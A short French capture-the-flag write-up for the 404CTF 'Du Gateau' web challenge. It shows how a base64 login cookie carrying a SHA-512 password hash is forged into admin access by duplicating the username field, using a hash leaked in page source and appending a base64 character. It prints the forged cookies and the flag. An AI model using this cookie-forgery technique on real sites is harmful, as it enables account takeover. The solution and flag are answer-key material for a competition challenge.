# Du Gateau

on se connecte au [site](https://du-gateau.404ctf.fr)

 - on arrive facilement à se connecter avec nimporte quel utilisateur et mot de passe. par exemple test:test
 
 - on récupère le cookie de connexion :

 ```sql
  dXNlcm5hbWU9dGVzdDtwYXNzd29yZD1lZTI2YjBkZDRhZjdlNzQ5YWExYThlZTNjMTBhZTk5MjNmNjE4OTgwNzcyZTQ3M2Y4ODE5YTVkNDk0MGUwZGIyN2FjMTg1ZjhhMGUxZDVmODRmODhiYzg4N2ZkNjdiMTQzNzMyYzMwNGNjNWZhOWFkOGU2ZjU3ZjUwMDI4YThmZg==
  ```

- on décode avec base64 :  
```text
username=test;password=ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff
```

et en cherchant bien dans le code source on peut remarquer qu'il y a une référence au **sha512**  et en tapant le sha512(test) on obtient effectivement: 
```text
ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff
```

ce qui correspond à la fin du cookie de connexion.

on a donc un cookie de la forme : 
```text
username=login;password=sha512(password)
```

on test avec **admin:test**

on a le cookie suivant :
```text
dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9ZWUyNmIwZGQ0YWY3ZTc0OWFhMWE4ZWUzYzEwYWU5OTIzZjYxODk4MDc3MmU0NzNmODgxOWE1ZDQ5NDBlMGRiMjdhYzE4NWY4YTBlMWQ1Zjg0Zjg4YmM4ODdmZDY3YjE0MzczMmMzMDRjYzVmYTlhZDhlNmY1N2Y1MDAyOGE4ZmY=
```

Mais on ne parvient pas à s'authentifier.

on contourne la verification avec un cookie de la forme : 
```text
username=test;username=admin;password=sha512(password)
```
```text
dXNlcm5hbWU9dGVzdDt1c2VybmFtZT1hZG1pbjtwYXNzd29yZD1lZTI2YjBkZDRhZjdlNzQ5YWExYThlZTNjMTBhZTk5MjNmNjE4OTgwNzcyZTQ3M2Y4ODE5YTVkNDk0MGUwZGIyN2FjMTg1ZjhhMGUxZDVmODRmODhiYzg4N2ZkNjdiMTQzNzMyYzMwNGNjNWZhOWFkOGU2ZjU3ZjUwMDI4YThmZg==
```

on accède enfin à l'onglet “Mot de Passe oublié”
quand on regarde le code source de la page, on trouve le sha512 du mdp de l'admin:

```text
66651013935b4c2c31d9baba8fa5d37b809b10da453f293ec8f9a7fbb2ab2e2c1d69dc8d80969508028b5ec14e9d1de585929a4c0d534996744b495c325e3f3d
```

on recrée un cookie : 

```text
dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9NjY2NTEwMTM5MzViNGMyYzMxZDliYWJhOGZhNWQzN2I4MDliMTBkYTQ1M2YyOTNlYzhmOWE3ZmJiMmFiMmUyYzFkNjlkYzhkODA5Njk1MDgwMjhiNWVjMTRlOWQxZGU1ODU5MjlhNGMwZDUzNDk5Njc0NGI0OTVjMzI1ZTNmM2Q=
```

mais ce cookie est filtré.

en utilisant des propriétés du base64, on ajoute un caractère au cookie et on arrive à entrer dans la page administration : 

>404CTF{m3f13Z_V0Us_D3s_MdP_D4nS_L3s_c00k13s!}